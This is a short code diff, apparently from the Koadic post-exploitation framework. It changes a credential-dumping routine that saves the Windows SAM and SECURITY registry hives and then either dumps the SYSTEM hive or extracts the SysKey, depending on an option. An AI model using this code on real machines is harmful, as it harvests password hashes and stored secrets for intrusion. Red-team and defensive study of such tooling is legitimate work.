@@ -51,8 +51,14 @@ try
 {
     DumpHive("SAM", "42SAM");
     DumpHive("SECURITY", "42SECURITY");
-    GetSysKey();
-    // DumpHive("SYSTEM", "42SYSTEM");
+    if (~GETSYSHIVE~)
+    {
+        DumpHive("SYSTEM", "42SYSTEM");
+    }
+    else
+    {
+        GetSysKey();
+    }
 
     Koadic.work.report("Complete");
 }
